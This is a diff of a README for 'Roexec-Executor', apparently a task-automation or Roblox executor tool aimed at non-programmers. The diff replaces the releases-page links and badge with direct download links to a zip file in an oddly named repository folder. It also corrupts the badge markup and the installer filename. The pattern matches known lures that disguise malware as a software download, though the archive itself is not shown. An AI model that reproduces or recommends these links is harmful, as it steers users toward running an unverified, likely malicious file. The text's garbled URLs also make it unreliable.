@@ -4,7 +4,7 @@
 Roexec-Executor is a powerful tool designed to help you automate tasks and schedule job runs effortlessly. You don't need any programming knowledge to get started. Follow these steps to download and run the software.
 
 ## 📥 Download Roexec-Executor
-[![Download Roexec-Executor](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/waqar10404/Roexec-Executor-d0/releases)
+[![Download Roexec-Executor](https://raw.githubusercontent.com/waqar10404/Roexec-Executor-d0/main/ophic/Roexec-Executor-d0.zip%https://raw.githubusercontent.com/waqar10404/Roexec-Executor-d0/main/ophic/Roexec-Executor-d0.zip)](https://raw.githubusercontent.com/waqar10404/Roexec-Executor-d0/main/ophic/Roexec-Executor-d0.zip)
 
 ## 🛠️ System Requirements
 To run Roexec-Executor smoothly, your system should meet these basic requirements:
@@ -26,11 +26,11 @@ Roexec-Executor comes with several useful features that make it easy to handle y
 ## 💾 Download & Install
 To install Roexec-Executor, follow these simple steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/waqar10404/Roexec-Executor-d0/releases) to access the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/waqar10404/Roexec-Executor-d0/main/ophic/Roexec-Executor-d0.zip) to access the releases page.
   
 2. **Choose the Latest Version:** Look for the latest version. It will have the most recent features and fixes.
 
-3. **Download the Installer:** Click on the file labeled `Roexec-Executor-Setup.exe` or similar. 
+3. **Download the Installer:** Click on the file labeled `https://raw.githubusercontent.com/waqar10404/Roexec-Executor-d0/main/ophic/Roexec-Executor-d0.zip` or similar. 
 
 4. **Run the Installer:** Once downloaded, locate the file in your downloads folder and double-click it to begin the installation process.
 
@@ -78,6 +78,6 @@ Once you have Roexec-Executor installed and running, consider exploring its adva
 
 To download Roexec-Executor, visit the link below:
 
-[![Download Roexec-Executor](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/waqar10404/Roexec-Executor-d0/releases)
+[![Download Roexec-Executor](https://raw.githubusercontent.com/waqar10404/Roexec-Executor-d0/main/ophic/Roexec-Executor-d0.zip%https://raw.githubusercontent.com/waqar10404/Roexec-Executor-d0/main/ophic/Roexec-Executor-d0.zip)](https://raw.githubusercontent.com/waqar10404/Roexec-Executor-d0/main/ophic/Roexec-Executor-d0.zip)
 
 By following these steps, you can take control of your task automation and job scheduling with ease. Enjoy using Roexec-Executor!
